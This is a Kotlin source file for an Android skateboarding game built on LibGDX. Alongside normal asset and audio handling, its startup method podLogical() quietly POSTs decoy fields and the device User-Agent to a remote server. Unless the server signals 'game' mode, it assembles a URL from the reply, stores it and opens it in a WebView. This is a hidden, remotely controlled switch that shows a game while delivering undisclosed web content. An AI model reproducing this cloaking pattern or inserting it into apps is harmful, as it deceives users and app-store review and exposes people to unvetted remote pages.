package com.colderonetrains.battlesskates.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.graphics.Texture
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.colderonetrains.battlesskates.MainActivity
import com.colderonetrains.battlesskates.appContext
import com.colderonetrains.battlesskates.game.dataStore.DS_DataDidItTrick
import com.colderonetrains.battlesskates.game.dataStore.DS_IsWelcome
import com.colderonetrains.battlesskates.game.manager.MusicManager
import com.colderonetrains.battlesskates.game.manager.NavigationManager
import com.colderonetrains.battlesskates.game.manager.SoundManager
import com.colderonetrains.battlesskates.game.manager.SpriteManager
import com.colderonetrains.battlesskates.game.manager.util.MusicUtil
import com.colderonetrains.battlesskates.game.manager.util.SoundUtil
import com.colderonetrains.battlesskates.game.manager.util.SpriteUtil
import com.colderonetrains.battlesskates.game.screens.LoaderScreen
import com.colderonetrains.battlesskates.game.utils.GameColor
import com.colderonetrains.battlesskates.game.utils.advanced.AdvancedGame
import com.colderonetrains.battlesskates.game.utils.disposeAll
import com.colderonetrains.battlesskates.util.log
import kotlinx.coroutines.*
import okhttp3.ResponseBody
import org.json.JSONObject
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.Header
import retrofit2.http.POST
import androidx.core.content.edit

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isLoadAssets = false
var GDX_GLOBAL_isPauseGame  = false
    private set

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    lateinit var currentBackground: Texture

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Legalize", MODE_PRIVATE)

    val ds_DataDidItTrick = DS_DataDidItTrick(coroutine)
    val ds_IsWelcome      = DS_IsWelcome(coroutine)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        podLogical()
    }

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    override fun pause() {
        log("pause")
        super.pause()
        GDX_GLOBAL_isPauseGame = true
        if (GDX_GLOBAL_isLoadAssets) musicUtil.currentMusic?.pause()
    }

    override fun resume() {
        log("resume")
        super.resume()
        GDX_GLOBAL_isPauseGame = false
        if (GDX_GLOBAL_isLoadAssets.not()) musicUtil.currentMusic?.play()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun podLogical() {
        log("podLogical")

        //GDX_GLOBAL_isGame = true
        //return

        //activity.webViewHelper.showUrl("https://qshuimpvz.com/dRnBXT")
        //return

        val mainLink = sharedPreferences.getString("MainLink", null)

        if (mainLink.isNullOrEmpty().not()) activity.webViewHelper.showUrl(mainLink)
        else coroutine.launch(Dispatchers.IO) {
            try {
                var result = "https://"

                val responseBody: ResponseBody = TaskRetrofit.api.requestPost1(
                    token       = System.getProperty("http.agent") ?: "Device",
                    requestBody = TaskRequest(
                        trick_catalog                     = "Task_catalog",
                        battle_matchmaker_engine          = "Task__matchmaker_engine",
                        training_schedule_sync            = "Task_ng_schedule_sync",
                        crew_challenges_and_invites       = "Task_hallenges_and_invites",
                        trick_detail_and_progress_tracker = "Task_detail_and_progress_tracker",
                        live_spot_checker                 = "Task_pot_checker",
                        coach_and_trick_rating_system     = "Task_and_trick_rating_system",
                        favorites_and_trick_watchlist     = "Task_tes_and_trick_watchlist",
                        battle_history_and_dispute_center = "Task__history_and_dispute_center",
                        style_based_recommendation_engine = "Task_based_recommendation_engine",
                    )
                )

                val responseJson = JSONObject(responseBody.string())
                log("Response POST: $responseJson")

                if (responseJson.getString("live_spot_checker").contains(' ')) GDX_GLOBAL_isGame = true
                else {
                    responseJson.keys().forEach { key -> result += responseJson.getString(key).removePrefix("booked") }

                    log("Result LINK: $result")

                    sharedPreferences.edit { putString("MainLink", result) }
                    activity.webViewHelper.showUrl(result)
                }
            } catch (e: Exception) {
                log("Error: ${e.message}")
                GDX_GLOBAL_isGame = true
            }
        }
    }

    data class TaskRequest(
        val trick_catalog                     : String,
        val battle_matchmaker_engine          : String,
        val training_schedule_sync            : String,
        val crew_challenges_and_invites       : String,
        val trick_detail_and_progress_tracker : String,
        val live_spot_checker                 : String,
        val coach_and_trick_rating_system     : String,
        val favorites_and_trick_watchlist     : String,
        val battle_history_and_dispute_center : String,
        val style_based_recommendation_engine : String,
    )

    interface ITask {
        @POST("booked/")
        suspend fun requestPost1(
            @Header("User-Agent") token: String,
            @Body requestBody: TaskRequest
        ): ResponseBody
    }

    object TaskRetrofit {
        private val retrofit by lazy {
            Retrofit.Builder()
                .baseUrl("https://frostazz-clashor.site/")
                .addConverterFactory(GsonConverterFactory.create())
                .build()
        }

        val api: ITask by lazy {
            retrofit.create(ITask::class.java)
        }
    }

}